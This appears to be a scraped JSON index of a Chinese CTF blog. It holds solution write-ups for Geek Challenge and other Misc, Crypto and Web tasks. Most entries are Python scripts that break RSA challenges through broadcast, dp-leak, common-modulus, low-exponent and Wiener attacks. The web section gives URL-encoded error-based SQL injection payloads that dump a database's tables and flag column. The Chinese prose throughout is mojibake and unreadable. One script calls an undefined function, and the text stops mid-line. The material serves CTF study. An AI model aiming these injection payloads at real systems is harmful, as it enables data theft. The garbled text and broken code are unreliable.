ilp(æ³¨æ„è¯·å°†è¯·å°†ç­”æ¡ˆå¥—ä¸ŠSYC{}æäº¤) ä½å¤´çœ‹ä½ çš„é”®ç›˜ï¼Œè¢«è¿™äº›å­—æ¯åŒ…å›´çš„æŒ‰é”®æ‹¼èµ·æ¥å°±æ˜¯flag\næˆéƒ½å…»çŒªäºŒå‚ æ‰‹è§£çŒªåœˆå¯†ç å¾—åˆ°å¦‚ä¸‹\n1 SSYIRCEEHSAGIULISOLBHY http://www.metools.info/code/railfencecipher_154.html\nåœ¨çº¿è§£æ …æ  key7å¾—åˆ°\n1 SYCHISHOUSEISREALLYBIG è§„è§„çŸ©çŸ©çš„å·¥ä½œ hintå¸Œå°”ï¼Œæ±‚é€†çŸ©é˜µç„¶åä¹˜encæ¨¡26\n1 2 3 4 5 6 7 8 9 10 11 import numpy as np from string import ascii_uppercase a = [[3,23,1],[23,5,24],[1,24,1]] enc = [[12],[12],[10]] out = [\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;] x = np.matmul(a,enc) # print(x) for i in range(3): out[i] = ascii_uppercase[x[i][0]%26] print(\u0026#39;\u0026#39;.join(out)) babyRSA å•¥éƒ½æœ‰äº†ï¼Œå°±æ˜¯rsaåŸºç¡€\n1 2 3 4 5 6 7 8 9 10 11 12 import gmpy2 from Crypto.Util.number import * c = 177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194 q = 166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043 n = 191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149 p = n//q e = 0x10001 phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = gmpy2.powmod(c, d, n) print(long_to_bytes(m)) Simple calculation å¾ˆçŸ­ç›´æ¥çˆ†ç ´å°±è¡Œ\n1 2 3 4 5 6 7 8 9 from string import ascii_uppercase as table for s0 in range(26): for s1 in range(26): for s2 in range(26): for s3 in range(26): for s4 in range(26): if (s0+s1+s2+s3+s4)%26==3 and (s0+s1+s2+s3*3+s4*5)%26==7 and (s0+s1*2+s2*2+s3*3+s4*3)%26==1 and (s0+s1*2+s2*5+s3*3+s4)%26==1 and (s0+s1*2+s2+s3*2+s4)%26==20: print(s0,s1,s2,s3,s4) print(\u0026#34;SYC{\u0026#34;+table[s0]+table[s1]+table[s2]+table[s3]+table[s4]+\u0026#34;}\u0026#34;) éŸ¡é«»çŒŠå²ˆ å¼—å‰å°¼äºšå¯†ç ï¼Œåœ¨çº¿è§£å¯†å°±è¡Œ\nchildRSA å¹¿æ’­æ”»å‡»\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # coding=utf-8 import gmpy2 from Crypto.Util.number import * def CRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) M = reduce(lambda x, y: x * y, mi) ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) for (m, a) in zip(mi, ai)] return reduce(lambda x, y: x + y, ai_ti_Mi) % M n = [] c = [] n1 = 0xe096219878f492bcdb2a2d03995521e7a65125733bae18e7d0005e35343fea3653698de60231d29b2d1b44a0b4ffd3183855b9042275f769e1702fa8843062df0938821db0258af40ab3cda8e54eb6ac826d545df91dfe76266cb01b1d6fad39e6ef13ce730c1c2395136b0bbdf22c6b0daba63701d71c6ae70d4e06935b9941 c1 = 0xff24bddc5a7b327535af92dba58c5d62a22d542e6ba1df6f91c98c7563d8e48e770fb623bfcc2f09ed49788293306ff709670b225da32ea134422d5e403b11c39ef6b144f96b2fe94b3aa136432ecea86a4069a4cb0b4d8570edb3fb5bb2cf0693184ef0c589887b012ebe6ea94e854a71a7eb768133d15e784e388976877db n2 = 0xa36b15a395edf3e99927f658e22d5f4aefd83434972c96cca5242a1aaa517ad83739451269723092dd9e73c00682dd3bbd74a985546def88196119b6d57b397283bc7b8b6029916df84284bec1725f6e5d3d29042af685c508a58ab6fb4e5bfeb326ae49330e3f4426abc1860ca4412feb976ee571075a47b854c9a6f5f0ebff c2 = 0x895f8283e2200bab1bf938ce3b5e42147b53a5178e436ea0b64a2380ba99776d5ba8046ef722858b20d9650ee68c09e905030f1634e0b32397b7b12236a5a301e5923a294ef1bdf16458f4fc8677370ce2ce3d0fd957da7466e5b104191d454455917147f3187b758c1c468db1b35514391e5b36bd1ac39e91bbb24fdbc07872 n3 = 0x9d4732db2539d1166dc6865670be11951bf49295bc8c472f34682a0fb7f2b3ba96dcfa1945c2e4685dfeae5255abe2ab3b7fb2282971bb16ce02d14082f71755e8a65c956e114336914a409a9f1158fb362a92c4e169fa3c460ea26fb5c6693447b14f1c3156a2d9308dd993d7ea708a00ad149fb77109d8a5f77de1703ba249 c3 = 0x3bead3d6760bff4de22562978d4722bb21ee4792ebdb32703b6df9ff5176e033e97ad8fc81467f4b3df7bd4e8bcae09462f3eca93a3da1cd9d7e8de3e464471fdd0b70112c1c738b0daa2a37a65331eaa8954b81b410f62a0280da32eb3e305782d5f774d814ca0adb13344687387cf72657dc21724bcf69da810d7635b99467 n.extend([n1,n2,n3]) c.extend([c1,c2,c3]) m3 = GCRT(n, c) print(m3[0]) m = gmpy2.iroot(m3[0], 3)[0] print(m) print(long_to_bytes(m)) Strange code funny rsa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import gmpy2 from sympy import nextprime from Crypto.Util.number import * from z3 import * c= 29481634166275444081755526650435050746177271929108540340839636645290382212801883156176249297905065394477723980727035074018048212479803055923507504121830977544547768817541693745091881774043457256431594076739380675412845360130106309932588508902347792967474645133565825400509525159035854284711152310367992325935 dp= 8488018598582161778909675874955311952104108410770019733352933135643797561752804534164335792268466126138022884715691928735179876112592458061466852929011221 dq= 1804557936862041610503694621208928380602760766763762174784442626117998593478392526552839638322965598840334590533505416988939157674783742124641579057347585 C_= 167991288045303000655678332469702456156006927056795988184486782639594811154157430883888171768898616013017469226146528316669411009693161813068877601341794154799154579698061130344409936572057393406182997791983691902804474594459551816221476117792337686268697787228149355295256968844786104832801764130261045846806268887759441150366851268084155967124558636130241419050274900078069517490749660442582935909745378880450868778768818202112172222446341661337699089743565266 N_= 1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258287506501285068163017195211966134698458111181058182005585938681465830111118867709096243399041372276386809721333892464112085735367452600541715292290079220522270815111077388426606567096816463177229069700881806969035414147663217609196771833717652147248133905228806566277089964340350926709132880091484440081291867 PHI_= 1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258165887575210803576766535149248650990306655744681050265422300794686668511098707335740896061248758188315389043730123141479632359506080499922725994127962549611715479724233268459284756489870354300620746588895051518136083710196648747569108450588260775600203396574920477102242310852948444452793222038768500472297680 E_ = 0x10001 D_ = gmpy2.invert(E_, PHI_) M_ = pow(C_, D_, N_) print(\u0026#34;hint: \u0026#34;,long_to_bytes(M_)) # ------------------------------------------------------ e = 0x10001 s = Solver() p_ = Int(\u0026#39;p_\u0026#39;) q_ = Int(\u0026#39;q_\u0026#39;) s.add(p_*q_==1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258287506501285068163017195211966134698458111181058182005585938681465830111118867709096243399041372276386809721333892464112085735367452600541715292290079220522270815111077388426606567096816463177229069700881806969035414147663217609196771833717652147248133905228806566277089964340350926709132880091484440081291867) s.add((p_-1)*(q_-1)==1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258165887575210803576766535149248650990306655744681050265422300794686668511098707335740896061248758188315389043730123141479632359506080499922725994127962549611715479724233268459284756489870354300620746588895051518136083710196648747569108450588260775600203396574920477102242310852948444452793222038768500472297680) if s.check() == sat: print(s.model()) # [q_ = 9386490551412435844811502505319278002577937841221881957073276159551090488386896450977177594453235429471397541114726559808406428210587601020931333624410531, # p_ = 121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984583657] p_ = 121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984583657 q = nextprime(gmpy2.iroot(p_, 2)[0]) tmp = q while True: tmp = tmp-1 if isPrime(tmp): print(\u0026#34;p:\u0026#34;, int(tmp)) p = int(tmp) I = gmpy2.invert(q, p) mp = pow(c, dp, p) mq = pow(c, dq, q) m=(((mp-mq)*I)%p)*q+mq print(long_to_bytes(m)) break web å¸¦æ¶äººå…­æ’ 1 2 3 4 5 6 7 8 # æ³¨åº“ åº“ågeek_sql %27+or+extractvalue%281%2Cconcat%280x7e%2C%28select+database%28%29%29%29%29+%23 # æ³¨è¡¨ è¡¨åblog,fllllag %27+or+extractvalue%281%2Cconcat%280x7e%2C%28select+group_concat%28TABLE_NAME%29+from+information_schema.TABLES+where+TABLE_SCHEMA+%3D+%27geek_sql%27%29%29%29+%23 # æ³¨åˆ— åˆ—åid,fllllllag %27+or+extractvalue%281%2Cconcat%280x7e%2C%28select+group_concat%28COLUMN_NAME%29+from+information_schema.COLUMNS+where+TABLE_SCHEMA+%3D+%27geek_sql%27+and+TABLE_NAME%3D%27fllllag%27%29%29%29+%23 # æ³¨flag flag{welcome_to_syclover} %27+or+extractvalue%281%2Cconcat%280x7e%2C%28select+fllllllag+from+geek_sql.fllllag+limit+2%2C1%29%29%29+%23 ","description":"","id":31,"section":"posts","tags":["CTF","WP"],"title":"ç¬¬åä¸€å±Šæå®¢å¤§æŒ‘æˆ˜Miscã€Cryptoé¢˜è§£","uri":"https://ruokeqx.gitee.io/posts/geek11/"},{"content":"æ‘¸äº†ä¼šé±¼ï¼Œå­¦ä¹ ä¸€ä¸‹RSAï¼Œæ²¡å‡†ä¸‹æ¬¡èƒ½ç­¾ä¸ªåˆ°ã€‚å‘œå‘œå‘œï¼Œå¤ªèœäº†ã€‚\nrsarsa 1 2 3 4 5 6 7 8 e = 65537 p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 n = p*q C = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 d = 56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977 m = pow(C,d,n) print(m) RSA1 dp dq\n1 2 3 4 5 6 7 8 9 10 11 12 13 import gmpy2 from Crypto.Util.number import * p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 I = gmpy2.invert(q, p) mp = pow(c, dp, p) mq = pow(c, dq, q) m=(((mp-mq)*I)%p)*q+mq print(long_to_bytes(m)) RSA2 dpæ³„éœ²\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import gmpy2 from Crypto.Util.number import * e = 65537 n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113 dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657 c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751 for i in range(1,65538): if (dp*e-1)%i == 0: if n%(((dp*e-1)//i)+1)==0: p=((dp*e-1)//i)+1 q=n//(((dp*e-1)//i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi m = pow(c,d,n) print(long_to_bytes(m)) RSA3 æ‰©å±•æ¬§å‡ é‡Œå¾—\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # coding=utf-8 import gmpy2 from Crypto.Util.number import * n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801 c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361 e1=11187289 c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397 e2=9647291 assert(gmpy2.gcd(e1,e2)==1) gcd, s, t = gmpy2.gcdext(e1, e2) s = - s c1 = gmpy2.invert(c1, n) ms = pow(c1, s, n) mt = pow(c2, t, n) m = ms*mt%n print(long_to_bytes(m)) Dangerous RSA ä½æŒ‡æ•°æ”»å‡»\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import gmpy2 from Crypto.Util.number import * n = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793 e = 0x3 c = 0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365 k = 0 while True: res = gmpy2.iroot(c+k*n, 3) if res[1]==True: print(long_to_bytes(res[0])) break k = k+1 [HDCTF2019]basic rsa çœŸå°±rsaåŸºç¡€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import gmpy2 from Crypto.Util.number import * from binascii import a2b_hex,b2a_hex flag = \u0026#34;\u0026#34; p = 262248800182277040650192055439906580479 q = 262854994239322828547925595487519915551 e = 65533 n = p*q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) c = 27565231154623519221597938803435789010285480123476977081867877272451638645710 m = pow(c, d, n) print(long_to_bytes(m)) rsa2 Wiener\u0026rsquo;s Attack\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator def hack_RSA(e,n): \u0026#39;\u0026#39;\u0026#39; Finds d knowing (e,n) applying the Wiener continued fraction attack \u0026#39;\u0026#39;\u0026#39; frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!=0 and (e*d-1)%k == 0: phi = (e*d-1)//k s = n - phi + 1 # check if the equation x^2 - s*x + n = 0 # has integer roots discr = s*s - 4*n if(discr\u0026gt;=0): t = Arithmetic.is_perfect_square(discr) if t!=-1 and (s+t)%2==0: print(\u0026#34;Hacked!\u0026#34;) return d # TEST functions def test_hack_RSA(): print(\u0026#34;Testing Wiener Attack\u0026#34;) times = 5 while(times\u0026gt;0): e,n,d = RSAvulnerableKeyGenerator.generateKeys(1024) print(\u0026#34;(e,n) is (\u0026#34;, e, \u0026#34;, \u0026#34;, n, \u0026#34;)\u0026#34;) print(\u0026#34;d = \u0026#34;, d) hacked_d = hack_RSA(e, n) if d == hacked_d: print(\u0026#34;Hack WORKED!\u0026#34;) else: print(\u0026#34;Hack FAILED\u0026#34;) print(\u0026#34;d = \u0026#34;, d, \u0026#34;, hacked_d = \u0026#34;, hacked_d) print(\u0026#34;-------------------------\u0026#34;) times -= 1 if __name__ == \u0026#34;__main__\u0026#34;: N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471 e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085 hacked_d = hack_RSA(e, N) print(\u0026#34;d =\u0026#34;, hacked_d) import hashlib flag = \u0026#34;flag{\u0026#34; + hashlib.md5(hex(hacked_d)).hexdigest() + \u0026#34;}\u0026#34; print(flag) [BJDCTF 2nd]rsa0 1 2 3 4 5 6 7 8 9 10 11 12 13 import gmpy2 from Crypto.Util.number import * e=16412969 # p+q=21474323937294223427029633006044232210144627658995261866208685988850000436515122573304502451444249691457249435728790344126596816839637513574593779046642132 # p-q=-3530704849939416130128795217866662706990139478488664405804918927334213577520082081558534570280645262486511199046994523103927323367477347680103067829901946 c = 66787387689969921866420074347299749477565324658007391062326189874749618152971805534966058181181742963789694672071035822688458412126937194610980555207839390188799347507006141157277940690848501622834024710740382183908481517573562946853585355166583862891066837397091757766328157130190310293512799363788698498081 q = 17943619087354807296900837788177569503154488180506597460403767061515786858995040491745967881163604428970738236681795821022669493472160165894490711216740186/2 p = 21474323937294223427029633006044232210144627658995261866208685988850000436515122573304502451444249691457249435728790344126596816839637513574593779046642132-q n = p*q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(long_to_bytes(m)) RSA5 eè¾ƒå¤§ ä¸é€‚åˆå¼€eæ¬¡æ–¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 import gmpy2 from Crypto.Util.number import * e = 65537 n1 = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207 c1 = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320 n2 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759 c2 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855 n3 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491 c3 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862 n4 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751 c4 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613 n5 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067 c5 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357 n6 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369 c6 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932 n7 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137 c7 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179 n8 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191 c8 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006 n9 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941 c9 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934 n10 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491 c10 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869 n11 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019 c11 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467 n12 = 